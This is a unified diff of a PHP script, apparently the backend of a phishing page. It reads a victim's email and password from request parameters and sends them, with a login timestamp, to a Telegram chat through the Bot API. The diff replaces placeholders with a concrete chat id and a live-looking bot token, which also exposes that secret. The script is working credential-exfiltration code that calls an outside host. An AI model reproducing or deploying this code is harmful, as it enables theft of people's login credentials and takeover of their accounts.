@@ -10,7 +10,7 @@ $password = $_GET["password"];
 
 $message = "Username : $email \nPassword: $password \nTried Login at $time IST";
 
-$chat_id= 1171876903; // replace with your userid
+$chat_id= 1297726110; // replace with your userid
 
 
 send_message($chat_id,"$message");
@@ -18,7 +18,7 @@ send_message($chat_id,"$message");
 
 function send_message($chat_id, $message){
         $text = urlencode($message);
-        $apiToken = "Your Bot Api Token";
+        $apiToken = "1470307515:AAH3mZq9OP_6rC31R2HFCJP2_vKmROA2Pf8";
         file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&text=$text");
     }
 ?>
